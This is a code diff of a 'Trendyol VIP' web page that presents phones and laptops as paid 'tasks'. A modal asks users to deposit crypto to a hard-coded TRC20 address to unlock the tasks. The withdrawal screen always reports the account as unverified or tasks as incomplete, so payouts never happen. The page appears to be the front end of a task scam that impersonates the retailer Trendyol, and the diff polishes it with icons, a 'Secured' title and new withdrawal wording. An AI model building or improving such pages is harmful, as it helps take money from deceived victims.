@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trendyol VIP - Global Partners</title>
+    <title>Trendyol VIP - Secured</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         :root { --primary: #f27a1a; --dark: #111; --gold: #c5a059; --green: #27ae60; --red: #e74c3c; --gray: #f4f7f6; }
@@ -16,8 +16,11 @@
         .section-title { padding: 20px; font-weight: bold; display: flex; justify-content: space-between; }
         .task-list { padding: 0 15px 100px 15px; }
         .task-card { background: white; border-radius: 15px; padding: 15px; margin-bottom: 15px; display: flex; gap: 15px; align-items: center; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
-        .task-img-container { width: 90px; height: 90px; background: #eee; border-radius: 12px; overflow: hidden; display: flex; align-items: center; justify-content: center; border: 1px solid #ddd; }
-        .task-img { width: 100%; height: 100%; object-fit: contain; }
+        
+        /* تصميم صندوق الأيقونة البديل للصورة */
+        .task-icon-box { width: 80px; height: 80px; background: #fff5ed; border-radius: 12px; display: flex; align-items: center; justify-content: center; border: 1px solid #ffe0cc; flex-shrink: 0; }
+        .task-icon-box svg { width: 45px; height: 45px; fill: var(--primary); }
+
         .task-info { flex: 1; }
         .task-name { font-weight: bold; font-size: 14px; color: #222; margin-bottom: 5px; }
         .task-profit { color: var(--green); font-weight: bold; }
@@ -61,7 +64,7 @@
         <div class="modal-content">
             <h3 id="m-title"></h3>
             <p id="m-desc" style="font-size: 14px; color: #666; line-height: 1.5;"></p>
-            <div id="m-extra" style="background:#f9f9f9; padding:15px; border-radius:10px; margin:15px 0; word-break:break-all; font-family:monospace;"></div>
+            <div id="m-extra" style="background:#f9f9f9; padding:15px; border-radius:10px; margin:15px 0; word-break:break-all; font-family:monospace; color: #333; font-weight: bold;"></div>
             <button class="btn-main" onclick="closeModal()">Close</button>
         </div>
     </div>
@@ -73,13 +76,21 @@
 
     let currentLang = 'en', userData = {}, currentUser = null;
 
-    // صور جديدة ومضمونة 100% من روابط مباشرة
+    // أيقونات SVG بدلاً من روابط الصور المكسورة
+    const icons = {
+        phone: `<svg viewBox="0 0 24 24"><path d="M17,19H7V5H17M17,1H7C5.89,1 5,1.89 5,3V21C5,22.1 5.89,23 7,23H17C18.1,23 19,22.1 19,21V3C19,1.89 18.1,1 17,1Z"/></svg>`,
+        laptop: `<svg viewBox="0 0 24 24"><path d="M20,18H22V20H2V18H4V5H20M18,16V7H6V16"/></svg>`,
+        watch: `<svg viewBox="0 0 24 24"><path d="M12,2C10.89,2 10,2.89 10,4V7H14V4C14,2.89 13.11,2 12,2M12,22C13.11,22 14,21.11 14,20V17H10V20C10,21.11 10.89,22 12,22M17,12C17,9.24 14.76,7 12,7C9.24,7 7,9.24 7,12C7,14.76 9.24,17 12,17C14.76,17 17,14.76 17,12Z"/></svg>`,
+        audio: `<svg viewBox="0 0 24 24"><path d="M12,2A9,9 0 0,0 3,11V19A2,2 0 0,0 5,21H8V13H5V11A7,7 0 0,1 12,4A7,7 0 0,1 19,11V13H16V21H19A2,2 0 0,0 21,19V11A9,9 0 0,0 12,2Z"/></svg>`,
+        game: `<svg viewBox="0 0 24 24"><path d="M21,6H3C1.9,6 1,6.9 1,8V16C1,17.1 1.9,18 3,18H21C22.1,18 23,17.1 23,16V8C23,6.9 22.1,6 21,6M6,15H4V13H2V11H4V9H6V11H8V13H6V15M13,11H11V9H13V11M13,15H11V13H13V15M16,13H14V11H16V13M16,17H14V15H16V17M19,11H17V9H19V11M19,15H17V13H19V15Z"/></svg>`
+    };
+
     const products = [
-        { name: "iPhone 15 Pro Max 256GB", price: 1199, profit: 4.44, img: "https://vjrqlysqpvhgffxzzvgz.supabase.co/storage/v1/object/public/assets/iphone.png?t=iphone" },
-        { name: "Sony Wireless Headphones XM5", price: 348, profit: 4.44, img: "https://vjrqlysqpvhgffxzzvgz.supabase.co/storage/v1/object/public/assets/sony.png" },
-        { name: "MacBook Air Laptop M2", price: 999, profit: 4.44, img: "https://vjrqlysqpvhgffxzzvgz.supabase.co/storage/v1/object/public/assets/mac.png" },
-        { name: "Samsung Galaxy S24 Ultra", price: 1299, profit: 4.44, img: "https://vjrqlysqpvhgffxzzvgz.supabase.co/storage/v1/object/public/assets/samsung.png" },
-        { name: "PlayStation 5 Console Slim", price: 449, profit: 4.44, img: "https://vjrqlysqpvhgffxzzvgz.supabase.co/storage/v1/object/public/assets/ps5.png" }
+        { name: "iPhone 15 Pro Max 256GB", price: 1199, profit: 4.44, icon: icons.phone },
+        { name: "MacBook Air Laptop M2", price: 999, profit: 4.44, icon: icons.laptop },
+        { name: "Sony Wireless Headphones XM5", price: 348, profit: 4.44, icon: icons.audio },
+        { name: "Apple Watch Ultra 2", price: 799, profit: 4.44, icon: icons.watch },
+        { name: "PlayStation 5 Console Slim", price: 449, profit: 4.44, icon: icons.game }
     ];
 
     async function handleAuth(type) {
@@ -113,8 +124,11 @@
         products.forEach((p) => {
             container.innerHTML += `
                 <div class="task-card">
-                    <div class="task-img-container"><img src="${p.img}" class="task-img" onerror="this.src='https://via.placeholder.com/100?text=Product'"></div>
-                    <div class="task-info"><div class="task-name">${p.name}</div><div class="task-profit">+ $${p.profit}</div></div>
+                    <div class="task-icon-box">${p.icon}</div>
+                    <div class="task-info">
+                        <div class="task-name">${p.name}</div>
+                        <div class="task-profit">+ $${p.profit}</div>
+                    </div>
                     <button class="btn-submit" onclick="submitTask()">${currentLang === 'en' ? 'Submit' : 'إرسال'}</button>
                 </div>`;
         });
@@ -124,14 +138,15 @@
 
     function openModal(type) {
         document.getElementById('modal').style.display = 'flex';
+        const extra = document.getElementById('m-extra');
         if (type === 'deposit') {
             document.getElementById('m-title').innerText = currentLang === 'en' ? "VIP Activation" : "تفعيل حساب VIP";
             document.getElementById('m-desc').innerText = currentLang === 'en' ? "Deposit to this TRC20 address to unlock tasks." : "قم بالإيداع في عنوان TRC20 أدناه لفتح المهام.";
-            document.getElementById('m-extra').innerText = "TG9gT1pPJK3aETRp1hVu28F5Zayu4oVyEg";
+            extra.innerText = "TG9gT1pPJK3aETRp1hVu28F5Zayu4oVyEg";
         } else {
             document.getElementById('m-title').innerText = currentLang === 'en' ? "Withdrawal" : "سحب الأرباح";
-            document.getElementById('m-desc').innerText = currentLang === 'en' ? "Complete all tasks first." : "أكمل جميع المهام أولاً.";
-            document.getElementById('m-extra').innerText = "Status: Pending Account Verification";
+            document.getElementById('m-desc').innerText = currentLang === 'en' ? "Complete all 10 tasks to withdraw." : "أكمل جميع المهام الـ 10 لتتمكن من السحب.";
+            extra.innerText = "Account Status: Unverified";
         }
     }
 
